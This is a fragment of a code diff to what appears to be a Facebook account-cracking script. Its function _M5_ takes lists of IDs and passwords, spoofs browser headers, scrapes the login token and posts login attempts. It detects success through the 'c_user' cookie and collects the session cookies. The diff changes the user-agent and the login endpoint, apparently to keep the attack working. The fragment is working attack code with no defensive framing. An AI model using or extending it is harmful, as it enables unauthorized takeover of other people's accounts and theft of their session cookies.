@@ -584,7 +584,7 @@ def _M5_(ids,pasx):
                         tedy =  {'Host': 'm.facebook.com', 
 	                'content-length': '506', 
 	                'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-	                'user-agent': 'Mozilla/5.0 (Linux; Android 5; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4639.81 Mobile Safari/537.36', 
+	                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
 	                'viewport-width': 'str(rr(400,989)', 
 	                'content-type': 'application/x-www-form-urlencoded', 
 	                'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
@@ -603,7 +603,7 @@ def _M5_(ids,pasx):
 	                'accept-encoding': 'gzip, deflate, br', 
 	                'accept-language': 'zh-CN;q=0.8,zh;q=0.9', 
 	                'x-response-format': 'JSONStream'}  
-                        lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
+                        lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
